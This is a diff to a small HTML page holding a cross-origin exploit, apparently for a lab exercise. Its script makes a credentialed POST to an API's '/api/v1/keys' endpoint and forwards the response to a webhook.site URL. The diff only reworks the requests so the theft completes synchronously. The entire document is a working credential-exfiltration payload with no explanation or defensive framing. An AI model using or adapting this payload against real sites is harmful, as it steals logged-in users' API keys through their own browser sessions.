@@ -1,14 +1,15 @@
 <html>
 	<body>
 		<script>
-			var req = new XMLHttpRequest();
-			req.open("POST", "http://api-ptl-ad42da05-c93d6931.libcurl.so//api/v1/keys", true);
-			req.withCredentials = true;
-			req.send();
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", "http://api-ptl-ad42da05-c93d6931.libcurl.so/api/v1/keys",false);
+			xhr.withCredentials =true;
+			xhr.send();
+			var a=xhr.responseText;
 			
-			function reqListener() {
-				location = 'https://webhook.site/5cecf538-0e1a-4443-a63c-2c051d404ed1/?key=' + req.responseText;	
-			}
+			var xhr2= new XMLHttpRequest();
+			xhr2.open("GET", "https://webhook.site/5cecf538-0e1a-4443-a63c-2c051d404ed1/?key="+a,false);
+			xhr2.send();
 		</script>
 	</body>
 </html>
